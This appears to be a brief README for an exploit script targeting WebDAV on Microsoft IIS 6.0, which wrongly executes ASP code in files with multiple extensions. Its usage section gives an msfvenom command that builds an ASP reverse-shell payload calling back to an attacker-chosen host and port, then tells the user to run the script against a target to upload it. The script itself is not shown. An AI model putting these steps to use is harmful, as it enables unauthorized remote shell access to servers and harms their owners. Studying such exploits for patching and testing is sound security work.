# WebDAV Upload Bypass

Simple Script to exploit Webdav running on Microsoft IIS 6.0 incorrectly executing ASP code in files that have multiple file extensions. 

**TO USE:**

Generate msfvenom payload: e.g. msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > \<filename\>
  
Then run: ./script \<host\> \<filename\>
